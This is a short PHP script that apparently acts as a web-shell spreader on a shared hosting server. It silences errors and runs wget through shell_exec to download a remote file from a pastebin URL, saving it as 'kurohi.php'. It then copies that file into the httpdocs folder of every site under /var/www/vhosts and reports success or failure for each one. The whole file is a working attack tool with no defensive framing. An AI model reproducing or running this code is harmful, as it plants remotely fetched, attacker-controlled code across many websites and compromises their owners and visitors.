<?php
error_reporting(0);

$root = '/var/www/vhosts';
$scan = scandir($root);

$n = 'kurohi.php';
$isi = shell_exec("wget 'https://pastebin.com/raw/M78s8viE' -O". $n);

$bikin = fopen($n, "w");
		 fwrite($bikin, $isi);
		 fclose($bikin);

foreach ( $scan as $a ) {
	$dir = "$a \n";
	$gas = $root.'/'.$a.'/httpdocs/'.$n;
	$cos = "$gas \n";
	$asu = @copy($n, $gas);
	if($asu) {
		print 'Done! => '.$cos; }
			else { print 'Failed! => '.$dir; }
	}
?>
